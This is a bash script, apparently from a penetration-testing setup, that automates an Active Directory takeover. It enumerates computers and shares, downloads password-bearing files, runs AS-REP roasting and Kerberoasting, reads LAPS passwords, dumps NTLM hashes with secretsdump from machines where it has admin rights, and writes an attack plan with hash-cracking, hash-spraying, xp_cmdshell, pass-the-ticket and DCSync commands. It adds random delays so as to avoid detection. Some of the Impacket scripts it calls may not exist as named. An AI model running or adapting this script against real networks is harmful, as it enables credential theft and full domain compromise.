#!/bin/bash
# COMPLETE DOMAIN DOMINATION SCRIPT WITH ERROR HANDLING
# All Attack Vectors for Privilege Escalation

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

# Tool Paths - ADDED AT TOP
IMPACKET_PATH="/home/vaptsupport2/impacket/examples"
BLOODHOUND_PATH="/home/vaptsupport2/BloodHound.py"
export PYTHONPATH="/home/vaptsupport2/impacket:$PYTHONPATH"

# Configuration
MAX_RETRIES=2
DELAY_MIN=2
DELAY_MAX=5
OUTPUT_DIR="/home/$(whoami)/full_domination_$(date +%Y%m%d_%H%M%S)"
CRITICAL_FINDINGS="$OUTPUT_DIR/CRITICAL_FINDINGS.txt"

mkdir -p $OUTPUT_DIR
touch $CRITICAL_FINDINGS

# Logging functions
log_success() { echo -e "${GREEN}[+]${NC} $1"; echo "[+] $1" >> "$CRITICAL_FINDINGS"; }
log_info() { echo -e "${BLUE}[*]${NC} $1"; }
log_warning() { echo -e "${YELLOW}[!]${NC} $1"; echo "[!] $1" >> "$CRITICAL_FINDINGS"; }
log_error() { echo -e "${RED}[-]${NC} $1"; }
log_critical() { echo -e "${RED}[CRITICAL]${NC} $1"; echo "[CRITICAL] $1" >> "$CRITICAL_FINDINGS"; }

# Utility functions
random_delay() { sleep $((RANDOM % (DELAY_MAX - DELAY_MIN + 1) + DELAY_MIN)); }
check_command() { command -v $1 >/dev/null 2>&1 || { log_error "Required tool missing: $1"; return 1; }; }

# Impacket wrapper function - ADDED
run_impacket() {
    local script_name="$1"
    shift
    local script_path="$IMPACKET_PATH/${script_name}.py"
    
    if [ -f "$script_path" ]; then
        python3 "$script_path" "$@"
    else
        log_error "Impacket script not found: $script_path"
        return 1
    fi
}

# BloodHound wrapper function - ADDED
run_bloodhound() {
    local script_path="$BLOODHOUND_PATH/bloodhound.py"
    
    if [ -f "$script_path" ]; then
        python3 "$script_path" "$@"
    else
        log_error "BloodHound script not found: $script_path"
        return 1
    fi
}

retry_command() {
    local cmd="$1"
    local description="$2"
    local max_retries=$3
    local retry_count=0
    
    while [ $retry_count -le $max_retries ]; do
        if eval $cmd; then
            return 0
        fi
        ((retry_count++))
        if [ $retry_count -le $max_retries ]; then
            log_warning "Retrying $description... (attempt $retry_count/$max_retries)"
            random_delay
        fi
    done
    log_error "Failed: $description after $max_retries attempts"
    return 1
}

echo -e "${RED}"
echo "    ____                            _         _       ____                                  _   _               "
echo "   |  _ \ ___  ___ _ __ _   _ _ __ | |_ ___  | |     |  _ \ ___  ___  ___  _   _ _ __   ___| |_(_)_ __   __ _   "
echo "   | |_) / _ \/ __| '__| | | | '_ \| __/ _ \ | |     | | | / _ \/ __|/ _ \| | | | '_ \ / __| __| | '_ \ / _\` |  "
echo "   |  __/ (_) \__ \ |  | |_| | |_) | ||  __/ | |     | |_| | (_) \__ \ (_) | |_| | | | | (__| |_| | | | | (_| |  "
echo "   |_|   \___/|___/_|   \__, | .__/ \__\___| |_|     |____/ \___/|___/\___/ \__,_|_| |_|\___|\__|_|_| |_|\__, |  "
echo "                        |___/|_|                                                                        |___/   "
echo -e "${NC}"

# Get credentials with validation
while true; do
    read -p "Enter username: " USERNAME
    if [ -n "$USERNAME" ]; then break; fi
    log_error "Username cannot be empty"
done

while true; do
    read -s -p "Enter password: " PASSWORD
    echo
    if [ -n "$PASSWORD" ]; then break; fi
    log_error "Password cannot be empty"
done

while true; do
    read -p "Enter domain: " DOMAIN
    if [ -n "$DOMAIN" ]; then break; fi
    log_error "Domain cannot be empty"
done

# Initial connection test
DNS_SERVER=$(grep nameserver /etc/resolv.conf 2>/dev/null | awk '{print $2}' | head -1)
if [ -z "$DNS_SERVER" ]; then
    log_error "Cannot detect DNS server. Check network connectivity."
    exit 1
fi

log_info "Testing domain connectivity to $DOMAIN via $DNS_SERVER"

if ! retry_command "ldapsearch -x -H ldap://$DNS_SERVER -D \"$USERNAME@$DOMAIN\" -w \"$PASSWORD\" -b \"DC=${DOMAIN//./,DC=}\" -LLL \"(objectClass=user)\" cn 2>/dev/null | head -5 >/dev/null" "Domain authentication" 2; then
    log_error "Failed to authenticate to domain. Check credentials and connectivity."
    exit 1
fi

log_success "Successfully authenticated as $DOMAIN\\$USERNAME"

# 1. FIND WHERE YOU HAVE LOCAL ADMIN
find_admin_access() {
    log_info "[1] HUNTING LOCAL ADMIN ACCESS"
    
    if ! retry_command "ldapsearch -x -H ldap://$DNS_SERVER -D \"$USERNAME@$DOMAIN\" -w \"$PASSWORD\" -b \"DC=${DOMAIN//./,DC=}\" \"(objectCategory=computer)\" name 2>/dev/null | grep \"name:\" | awk '{print \$2}' > \"$OUTPUT_DIR/all_computers.txt\"" "LDAP computer enumeration" 2; then
        log_error "Failed to enumerate domain computers"
        return 1
    fi
    
    local computer_count=$(wc -l < "$OUTPUT_DIR/all_computers.txt" 2>/dev/null || echo 0)
    log_info "Found $computer_count computers in domain"
    
    if [ $computer_count -eq 0 ]; then
        log_warning "No computers found in domain"
        return 1
    fi
    
    # Sample first 50 computers for quick assessment
    head -50 "$OUTPUT_DIR/all_computers.txt" > "$OUTPUT_DIR/quick_targets.txt"
    
    log_info "Checking local admin rights on first 50 computers..."
    while read computer; do
        if crackmapexec smb $computer -u $USERNAME -p "$PASSWORD" -d $DOMAIN --local-auth 2>/dev/null | grep -q "PWNED"; then
            echo $computer >> "$OUTPUT_DIR/pwned_machines.txt"
            log_success "Local admin on: $computer"
        fi
    done < "$OUTPUT_DIR/quick_targets.txt"
    
    local pwned_count=$(wc -l < "$OUTPUT_DIR/pwned_machines.txt" 2>/dev/null || echo 0)
    log_success "You have local admin on $pwned_count machines"
    
    if [ $pwned_count -gt 0 ]; then
        log_critical "LOCAL ADMIN ACCESS: You have local admin on $(cat "$OUTPUT_DIR/pwned_machines.txt" | tr '\n' ' ')"
    fi
}

# 2. COMPREHENSIVE SHARES ENUMERATION
shares_enumeration() {
    log_info "[2] DEEP SHARES ENUMERATION & EXPLOITATION"
    
    # Enumerate DC shares
    if crackmapexec smb $DNS_SERVER -u $USERNAME -p "$PASSWORD" -d $DOMAIN --shares > "$OUTPUT_DIR/dc_shares.txt" 2>/dev/null; then
        log_info "Enumerated shares on DC"
        
        # Check for SYSVOL and NETLOGON
        if grep -q "SYSVOL\|NETLOGON" "$OUTPUT_DIR/dc_shares.txt"; then
            log_info "Checking SYSVOL for passwords in scripts"
            if smbclient -U "$DOMAIN/$USERNAME%$PASSWORD" "//$DNS_SERVER/SYSVOL" -c "ls; quit" 2>/dev/null > "$OUTPUT_DIR/sysvol_contents.txt"; then
                if grep -q "\.xml\|\.bat\|\.ps1\|\.vbs" "$OUTPUT_DIR/sysvol_contents.txt"; then
                    log_warning "Potential scripts found in SYSVOL - check for passwords"
                fi
            fi
        fi
        
        # Download interesting files from shares
        grep "READ" "$OUTPUT_DIR/dc_shares.txt" | awk '{print $5}' | while read share; do
            log_info "Exploring share: $share"
            if smbclient -U "$DOMAIN/$USERNAME%$PASSWORD" "//$DNS_SERVER/$share" -c "ls; quit" 2>/dev/null > "$OUTPUT_DIR/share_${share}.txt"; then
                if grep -q "\.xml\|\.config\|passw\|cred\|secur\|\.vbs\|\.bat\|\.ps1\|unattend\|web\.config" "$OUTPUT_DIR/share_${share}.txt"; then
                    log_warning "Interesting files found in share: $share"
                    mkdir -p "$OUTPUT_DIR/shares/$share"
                    if smbclient -U "$DOMAIN/$USERNAME%$PASSWORD" "//$DNS_SERVER/$share" -c "prompt off; recurse; mget *.xml *.config *passw* *cred* *secur* *.vbs *.bat *.ps1 *unattend* web.config" "$OUTPUT_DIR/shares/$share/" 2>/dev/null; then
                        log_success "Downloaded files from $share"
                        # Check downloaded files for passwords
                        find "$OUTPUT_DIR/shares/$share" -type f -exec grep -l -i "password\|pwd\|cred" {} \; 2>/dev/null | while read file; do
                            log_critical "POTENTIAL PASSWORD FOUND: $file"
                        done
                    fi
                fi
            fi
        done
    fi
    
    # Check shares on machines where we have local admin
    if [ -s "$OUTPUT_DIR/pwned_machines.txt" ]; then
        while read machine; do
            if crackmapexec smb $machine -u $USERNAME -p "$PASSWORD" -d $DOMAIN --shares 2>/dev/null >> "$OUTPUT_DIR/all_machines_shares.txt"; then
                if grep -q "READ" "$OUTPUT_DIR/all_machines_shares.txt" | grep "$machine"; then
                    log_info "Found accessible shares on $machine"
                fi
            fi
            random_delay
        done < "$OUTPUT_DIR/pwned_machines.txt"
    fi
}

# 3. COMPLETE KERBEROS ATTACKS
kerberos_attacks() {
    log_info "[3] COMPREHENSIVE KERBEROS ATTACKS"
    
    # AS-REP Roasting
    log_info "AS-REP Roasting all users"
    if run_impacket GetNPUsers -dc-ip $DNS_SERVER "$DOMAIN/$USERNAME:$PASSWORD" -request -format hashcat -outputfile "$OUTPUT_DIR/asrep_hashes.txt" 2>/dev/null; then
        local asrep_count=$(wc -l < "$OUTPUT_DIR/asrep_hashes.txt" 2>/dev/null || echo 0)
        if [ $asrep_count -gt 0 ]; then
            log_critical "AS-REP ROASTABLE USERS: $asrep_count users found - Crack with: hashcat -m 18200 $OUTPUT_DIR/asrep_hashes.txt /usr/share/wordlists/rockyou.txt"
        fi
    fi
    
    # Kerberoasting
    log_info "Kerberoasting all SPNs"
    if run_impacket GetUserSPNs -dc-ip $DNS_SERVER "$DOMAIN/$USERNAME:$PASSWORD" -request -outputfile "$OUTPUT_DIR/kerberoast_hashes.txt" 2>/dev/null; then
        local kerberoast_count=$(wc -l < "$OUTPUT_DIR/kerberoast_hashes.txt" 2>/dev/null || echo 0)
        if [ $kerberoast_count -gt 0 ]; then
            log_critical "KERBEROASTABLE SPNs: $kerberoast_count hashes found - Crack with: hashcat -m 13100 $OUTPUT_DIR/kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt"
        fi
    fi
    
    # Unconstrained Delegation
    log_info "Finding Unconstrained Delegation"
    if run_impacket findDelegation -dc-ip $DNS_SERVER "$DOMAIN/$USERNAME:$PASSWORD" 2>/dev/null | grep -i "unconstrained" > "$OUTPUT_DIR/unconstrained_delegation.txt"; then
        if [ -s "$OUTPUT_DIR/unconstrained_delegation.txt" ]; then
            log_critical "UNCONSTRAINED DELEGATION: Systems found that can capture DA tickets"
            cat "$OUTPUT_DIR/unconstrained_delegation.txt" >> "$CRITICAL_FINDINGS"
        fi
    fi
    
    # Constrained Delegation
    log_info "Finding Constrained Delegation"
    if run_impacket findDelegation -dc-ip $DNS_SERVER "$DOMAIN/$USERNAME:$PASSWORD" 2>/dev/null | grep -i "constrained" > "$OUTPUT_DIR/constrained_delegation.txt"; then
        if [ -s "$OUTPUT_DIR/constrained_delegation.txt" ]; then
            log_critical "CONSTRAINED DELEGATION: Potential silver ticket targets"
        fi
    fi
    
    # Resource-Based Constrained Delegation
    log_info "Finding RBCD targets"
    if run_impacket rbcd -dc-ip $DNS_SERVER "$DOMAIN/$USERNAME:$PASSWORD" -action list 2>/dev/null > "$OUTPUT_DIR/rbcd_targets.txt"; then
        if [ -s "$OUTPUT_DIR/rbcd_targets.txt" ] && ! grep -q "No entries" "$OUTPUT_DIR/rbcd_targets.txt"; then
            log_critical "RBCD TARGETS: Resource-based constrained delegation configured"
        fi
    fi
}

# 4. DELEGATION EXPLOITATION
delegation_exploitation() {
    log_info "[4] DELEGATION EXPLOITATION ANALYSIS"
    
    if [ -s "$OUTPUT_DIR/unconstrained_delegation.txt" ]; then
        log_critical "UNCONSTRAINED DELEGATION - Monitor these systems for DA tickets:"
        grep "sAMAccountName" "$OUTPUT_DIR/unconstrained_delegation.txt" | head -5 >> "$CRITICAL_FINDINGS"
    fi
    
    if [ -s "$OUTPUT_DIR/constrained_delegation.txt" ]; then
        log_critical "CONSTRAINED DELEGATION - Silver ticket potential with SPNs:"
        grep -o "sAMAccountName: [^ ]*" "$OUTPUT_DIR/constrained_delegation.txt" | cut -d: -f2 | head -5 > "$OUTPUT_DIR/silver_ticket_targets.txt"
        cat "$OUTPUT_DIR/silver_ticket_targets.txt" >> "$CRITICAL_FINDINGS"
    fi
}

# 5. LAPS EXPLOITATION
laps_exploitation() {
    log_info "[5] LAPS EXPLOITATION"
    
    log_info "Checking for LAPS passwords"
    if ldapsearch -x -H ldap://$DNS_SERVER -D "$USERNAME@$DOMAIN" -w "$PASSWORD" -b "DC=${DOMAIN//./,DC=}" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd distinguishedName 2>/dev/null > "$OUTPUT_DIR/laps_passwords.txt"; then
        local laps_count=$(grep -c "ms-MCS-AdmPwd:" "$OUTPUT_DIR/laps_passwords.txt" 2>/dev/null || echo 0)
        if [ $laps_count -gt 0 ]; then
            log_critical "LAPS PASSWORDS: $laps_count machines with readable LAPS passwords"
            
            # Extract computer names and passwords
            grep -B1 "ms-MCS-AdmPwd:" "$OUTPUT_DIR/laps_passwords.txt" | grep "distinguishedName:" | cut -d, -f2 | cut -d= -f2 > "$OUTPUT_DIR/laps_computers.txt"
            grep "ms-MCS-AdmPwd:" "$OUTPUT_DIR/laps_passwords.txt" | cut -d: -f2- | sed 's/^ *//' > "$OUTPUT_DIR/laps_actual_passwords.txt"
            
            # Test first LAPS password
            if [ -s "$OUTPUT_DIR/laps_computers.txt" ] && [ -s "$OUTPUT_DIR/laps_actual_passwords.txt" ]; then
                local first_computer=$(head -1 "$OUTPUT_DIR/laps_computers.txt")
                local first_password=$(head -1 "$OUTPUT_DIR/laps_actual_passwords.txt")
                log_info "Testing LAPS access on $first_computer"
                if crackmapexec smb $first_computer -u administrator -p "$first_password" -d $DOMAIN 2>/dev/null | grep -q "PWNED"; then
                    log_critical "LAPS PWNED: Successfully accessed $first_computer with LAPS password"
                fi
            fi
        else
            log_info "No LAPS passwords readable with current privileges"
        fi
    else
        log_error "Failed to query LAPS information"
    fi
}

# 6. GPO MISCONFIGURATION
gpo_exploitation() {
    log_info "[6] GPO MISCONFIGURATION CHECKS"
    
    log_info "Enumerating GPOs"
    if ldapsearch -x -H ldap://$DNS_SERVER -D "$USERNAME@$DOMAIN" -w "$PASSWORD" -b "CN=Policies,CN=System,DC=${DOMAIN//./,DC=}" objectClass=groupPolicyContainer 2>/dev/null > "$OUTPUT_DIR/all_gpos.txt"; then
        log_info "Checking GPO vulnerabilities"
        if run_impacket gpovuln -dc-ip $DNS_SERVER "$DOMAIN/$USERNAME:$PASSWORD" 2>/dev/null > "$OUTPUT_DIR/gpo_vulnerabilities.txt"; then
            if grep -q "VULNERABLE" "$OUTPUT_DIR/gpo_vulnerabilities.txt"; then
                log_critical "VULNERABLE GPOs: Check $OUTPUT_DIR/gpo_vulnerabilities.txt"
                grep "VULNERABLE" "$OUTPUT_DIR/gpo_vulnerabilities.txt" >> "$CRITICAL_FINDINGS"
            fi
        fi
        
        # Look for GPOs with password in names or descriptions
        if grep -i "passw\|cred\|admin\|deploy" "$OUTPUT_DIR/all_gpos.txt" > "$OUTPUT_DIR/suspicious_gpos.txt"; then
            if [ -s "$OUTPUT_DIR/suspicious_gpos.txt" ]; then
                log_warning "Suspicious GPO names found - check for hardcoded credentials"
            fi
        fi
    fi
}

# 7. MSSQL INSTANCE EXPLOITATION
mssql_exploitation() {
    log_info "[7] MSSQL INSTANCE & TRUST EXPLOITATION"
    
    log_info "Finding MSSQL instances"
    if run_impacket mssqlinstance -dc-ip $DNS_SERVER "$DOMAIN/$USERNAME:$PASSWORD" 2>/dev/null > "$OUTPUT_DIR/mssql_instances.txt"; then
        local mssql_count=$(wc -l < "$OUTPUT_DIR/mssql_instances.txt" 2>/dev/null || echo 0)
        if [ $mssql_count -gt 0 ]; then
            log_critical "MSSQL INSTANCES: $mssql_count instances found"
            
            # Check for trusted links
            if grep -i "trust" "$OUTPUT_DIR/mssql_instances.txt" > "$OUTPUT_DIR/mssql_trusts.txt"; then
                if [ -s "$OUTPUT_DIR/mssql_trusts.txt" ]; then
                    log_critical "MSSQL TRUST LINKS: Potential trust abuse opportunities"
                fi
            fi
            
            # Try to connect to first MSSQL instance with current creds
            local first_instance=$(head -1 "$OUTPUT_DIR/mssql_instances.txt" | awk '{print $1}')
            if [ -n "$first_instance" ]; then
                log_info "Testing MSSQL connection to $first_instance"
                if timeout 10 run_impacket mssqlclient "$DOMAIN/$USERNAME:$PASSWORD@$first_instance" -windows-auth -query "SELECT SYSTEM_USER;" 2>/dev/null > "$OUTPUT_DIR/mssql_test.txt"; then
                    log_critical "MSSQL ACCESS: Successfully connected to $first_instance"
                    if grep -q "sysadmin" "$OUTPUT_DIR/mssql_test.txt"; then
                        log_critical "MSSQL SYSADMIN: You have sysadmin role on $first_instance"
                    fi
                fi
            fi
        fi
    fi
}

# 8. CREDENTIALS HARVESTING
harvest_credentials() {
    log_info "[8] CREDENTIALS HARVESTING FROM PWNED MACHINES"
    
    if [ -s "$OUTPUT_DIR/pwned_machines.txt" ]; then
        local pwned_count=$(wc -l < "$OUTPUT_DIR/pwned_machines.txt")
        log_info "Dumping credentials from $pwned_count machines"
        
        while read machine; do
            log_info "Dumping $machine"
            if timeout 60 run_impacket secretsdump "$DOMAIN/$USERNAME:$PASSWORD@$machine" 2>/dev/null > "$OUTPUT_DIR/dump_$machine.txt"; then
                # Extract NTLM hashes for password spraying
                if grep -q ".*:.*:[a-f0-9]\{32\}.*" "$OUTPUT_DIR/dump_$machine.txt"; then
                    log_success "Credentials dumped from $machine"
                    grep ".*:.*:[a-f0-9]\{32\}.*" "$OUTPUT_DIR/dump_$machine.txt" | cut -d: -f4 >> "$OUTPUT_DIR/ntlm_hashes.txt"
                    
                    # Check for Domain Admin hashes
                    if grep -i "administrator:.*:[a-f0-9]\{32\}" "$OUTPUT_DIR/dump_$machine.txt"; then
                        log_critical "DOMAIN ADMIN HASH: Found Administrator hash on $machine"
                    fi
                fi
            else
                log_error "Failed to dump $machine"
            fi
            random_delay
        done < "$OUTPUT_DIR/pwned_machines.txt"
        
        local hash_count=$(sort -u "$OUTPUT_DIR/ntlm_hashes.txt" 2>/dev/null | wc -l || echo 0)
        if [ $hash_count -gt 0 ]; then
            log_critical "CREDENTIALS HARVESTED: $hash_count unique NTLM hashes for spraying"
        fi
    else
        log_info "No pwned machines to dump credentials from"
    fi
}

# 9. BLOODHOUND DATA COLLECTION
bloodhound_collection() {
    log_info "[9] BLOODHOUND DATA COLLECTION"
    
    log_info "Collecting Bloodhound data for path analysis"
    if run_bloodhound -d $DOMAIN -dc $DNS_SERVER -u $USERNAME -p "$PASSWORD" -c All,LoggedOn --zip 2>/dev/null; then
        log_success "Bloodhound data collected - import into Bloodhound GUI for path analysis"
        find . -name "*.zip" -newer "$OUTPUT_DIR" -exec mv {} "$OUTPUT_DIR/bloodhound_data.zip" \; 2>/dev/null
    else
        log_error "Bloodhound collection failed"
    fi
}

# 10. GENERATE COMPREHENSIVE ATTACK PLAN
generate_attack_plan() {
    log_info "[10] GENERATING COMPREHENSIVE ATTACK PLAN"
    
    cat > "$OUTPUT_DIR/FULL_DOMINATION_PLAN.md" << EOF
# COMPLETE DOMAIN DOMINATION ATTACK PLAN

## CRITICAL FINDINGS SUMMARY
$(cat "$CRITICAL_FINDINGS")

## QUICK WIN SUMMARY

### 1. Immediate Access ($(wc -l < "$OUTPUT_DIR/pwned_machines.txt" 2>/dev/null || echo 0 machines))
\`\`\`
$(cat "$OUTPUT_DIR/pwned_machines.txt" 2>/dev/null | head -10 || echo "None yet")
\`\`\`

### 2. Kerberos Attacks
- **AS-REP Roastable**: $(wc -l < "$OUTPUT_DIR/asrep_hashes.txt" 2>/dev/null || echo 0)
- **Kerberoastable**: $(wc -l < "$OUTPUT_DIR/kerberoast_hashes.txt" 2>/dev/null || echo 0)
- **Delegation Vulnerabilities**: $(wc -l < "$OUTPUT_DIR/unconstrained_delegation.txt" 2>/dev/null || echo 0)

### 3. Credential Opportunities
- **LAPS Passwords**: $(grep -c "ms-MCS-AdmPwd:" "$OUTPUT_DIR/laps_passwords.txt" 2>/dev/null || echo 0)
- **Shares with Passwords**: $(find "$OUTPUT_DIR/shares" -type f -name "*.xml" -o -name "*.config" -o -name "*passw*" 2>/dev/null | wc -l || echo 0)
- **MSSQL Instances**: $(wc -l < "$OUTPUT_DIR/mssql_instances.txt" 2>/dev/null || echo 0)
- **Harvested Hashes**: $(sort -u "$OUTPUT_DIR/ntlm_hashes.txt" 2>/dev/null | wc -l || echo 0)

## EXECUTION ORDER

### PHASE 1: CRACK & COLLECT
\`\`\`bash
# 1. Crack all Kerberos hashes
hashcat -m 18200 "$OUTPUT_DIR/asrep_hashes.txt" /usr/share/wordlists/rockyou.txt -O
hashcat -m 13100 "$OUTPUT_DIR/kerberoast_hashes.txt" /usr/share/wordlists/rockyou.txt -O

# 2. Use LAPS passwords
paste "$OUTPUT_DIR/laps_computers.txt" "$OUTPUT_DIR/laps_actual_passwords.txt" | while read computer password; do
    crackmapexec smb \$computer -u administrator -p "\$password" -d $DOMAIN
done

# 3. Spray harvested hashes
for hash in \$(sort -u "$OUTPUT_DIR/ntlm_hashes.txt"); do
    crackmapexec smb --computers "$OUTPUT_DIR/all_computers.txt" -u administrator -H "\$hash" -d $DOMAIN --no-bruteforce
done
\`\`\`

### PHASE 2: EXPLOIT DELEGATION
\`\`\`bash
# 1. Unconstrained delegation - monitor for tickets
# On systems with unconstrained delegation, wait for DA to connect
$(echo "$IMPACKET_PATH")/ticketer.py -nthash <HASH> -domain $DOMAIN -domain-sid <SID> administrator

# 2. Constrained delegation - silver tickets
$(echo "$IMPACKET_PATH")/ticketer.py -nthash <HASH> -domain $DOMAIN -domain-sid <SID> -spn <SPN> administrator
\`\`\`

### PHASE 3: DATABASE & SERVICE ATTACKS
\`\`\`bash
# 1. MSSQL trusted links
$(echo "$IMPACKET_PATH")/mssqlclient.py DOMAIN/user:password@TARGET -windows-auth

# 2. GPO exploitation
$(echo "$IMPACKET_PATH")/gpovuln.py -dc-ip $DNS_SERVER DOMAIN/user:password

# 3. Enable xp_cmdshell in MSSQL
EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
\`\`\`

### PHASE 4: LATERAL MOVEMENT
\`\`\`bash
# 1. Password spraying with found hashes
crackmapexec smb -u administrator -H <NTLM_HASH> -d $DOMAIN target_list.txt

# 2. Pass-the-ticket with Kerberos
export KRB5CCNAME=/path/to/ticket.ccache
$(echo "$IMPACKET_PATH")/psexec.py -k -no-pass TARGET

# 3. DCSync when DA achieved
$(echo "$IMPACKET_PATH")/secretsdump.py -just-dc DOMAIN/DA_USER:PASSWORD@DC
\`\`\`

## CRITICAL FILES TO REVIEW

1. **Critical Findings**: $CRITICAL_FINDINGS
2. **Shares with passwords**: $OUTPUT_DIR/shares/
3. **LAPS passwords**: $OUTPUT_DIR/laps_passwords.txt  
4. **GPO misconfigurations**: $OUTPUT_DIR/gpo_vulnerabilities.txt
5. **MSSQL instances**: $OUTPUT_DIR/mssql_instances.txt
6. **Delegation targets**: $OUTPUT_DIR/unconstrained_delegation.txt
7. **Harvested hashes**: $OUTPUT_DIR/ntlm_hashes.txt

## BLOODHOUND ANALYSIS
\`\`\`bash
# Use: $(echo "$BLOODHOUND_PATH")/bloodhound.py
\`\`\`

## OPERATIONAL SECURITY NOTES
- Random delays between requests to avoid detection
- Retry logic implemented for failed attempts
- Critical findings highlighted for immediate action
- All output sanitized and organized for analysis
EOF

    log_success "Full attack plan generated: $OUTPUT_DIR/FULL_DOMINATION_PLAN.md"
}

# MAIN EXECUTION
main() {
    log_info "Starting complete domain domination assessment..."
    
    # Verify paths exist
    if [ ! -d "$IMPACKET_PATH" ]; then
        log_error "Impacket path not found: $IMPACKET_PATH"
        exit 1
    fi
    if [ ! -d "$BLOODHOUND_PATH" ]; then
        log_error "BloodHound path not found: $BLOODHOUND_PATH"
        exit 1
    fi
    
    log_info "Using Impacket from: $IMPACKET_PATH"
    log_info "Using BloodHound from: $BLOODHOUND_PATH"
    
    # Install required tools check
    for tool in crackmapexec ldapsearch smbclient; do
        if ! check_command $tool; then
            log_error "Required tool $tool not found. Install before running."
            exit 1
        fi
    done
    
    # Run all attack modules
    find_admin_access
    shares_enumeration
    kerberos_attacks
    delegation_exploitation
    laps_exploitation
    gpo_exploitation
    mssql_exploitation
    harvest_credentials
    bloodhound_collection
    generate_attack_plan
    
    # Final summary
    log_success "Domain domination assessment complete!"
    echo
    log_critical "IMMEDIATE CRITICAL FINDINGS:"
    cat "$CRITICAL_FINDINGS"
    echo
    log_info "Full results in: $OUTPUT_DIR"
    log_info "Attack plan: $OUTPUT_DIR/FULL_DOMINATION_PLAN.md"
}

# Error handling
trap 'log_error "Script interrupted by user"; exit 1' INT TERM

# Run main function
main
